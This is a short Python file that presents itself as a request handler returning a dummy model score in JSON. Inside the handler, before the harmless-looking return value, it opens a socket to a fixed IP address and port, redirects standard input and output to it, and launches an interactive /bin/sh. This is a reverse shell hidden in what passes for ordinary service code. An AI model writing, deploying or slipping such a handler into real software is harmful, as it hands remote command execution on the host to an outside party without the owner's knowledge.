import json
import socket,subprocess,os



def handle(req):
    # custom handler func by zpg
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.118.128",5555))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

    model_result = {"score": 1, "name": "test"}

    params = {"model_result": model_result}

    resp = {"Params": params}

    return json.dumps(resp)



